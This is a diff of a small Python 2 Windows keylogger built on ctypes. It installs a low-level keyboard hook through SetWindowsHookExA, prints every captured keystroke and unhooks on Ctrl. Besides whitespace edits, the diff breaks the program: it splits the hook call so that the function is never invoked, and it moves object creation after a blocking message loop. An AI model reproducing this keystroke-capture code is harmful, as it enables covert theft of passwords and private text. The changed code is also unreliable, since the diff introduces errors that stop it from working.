@@ -3,7 +3,6 @@ from ctypes import *
 from ctypes.wintypes import MSG
 from ctypes.wintypes import DWORD
 
-
 user32 = windll.user32                                                            #(1)
 kernel32 = windll.kernel32
 
@@ -15,9 +14,10 @@ class KeyLogger:                                                                
     def __init__(self):
         self.lUser32     = user32
         self.hooked     = None
-    
+
     def installHookProc(self, pointer):                                           #(4)
-        self.hooked = self.lUser32.SetWindowsHookExA( 
+        self.hooked = self.lUser32.SetWindowsHookExA
+        (
                         WH_KEYBOARD_LL, 
                         pointer, 
                         kernel32.GetModuleHandleW(None), 
@@ -33,29 +33,35 @@ class KeyLogger:                                                                
         self.lUser32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
 
+
 def getFPTR(fn):                                                                  #(6)
     CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
     return CMPFUNC(fn)
 
+
 def hookProc(nCode, wParam, lParam):                                              #(7)
     if wParam is not WM_KEYDOWN:
         return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
+
     hookedKey = chr(lParam[0])
     print hookedKey
+
     if(CTRL_CODE == int(lParam[0])):
         print "Ctrl pressed, call uninstallHook()"
         keyLogger.uninstallHookProc()
         sys.exit(-1)
-    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)     
+
+    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
+
 
 def startKeyLog():                                                                 #(8)
      msg = MSG()
      user32.GetMessageA(byref(msg),0,0,0)
     
-keyLogger = KeyLogger() #start of hook process                                     #(9)
-pointer = getFPTR(hookProc) 
+     keyLogger = KeyLogger() #start of hook process                                     #(9)
+     pointer = getFPTR(hookProc)
 
-if keyLogger.installHookProc(pointer):
-    print "installed keyLogger"
 
-startKeyLog()
+     if keyLogger.installHookProc(pointer):
+         print "installed keyLogger"
+         startKeyLog()
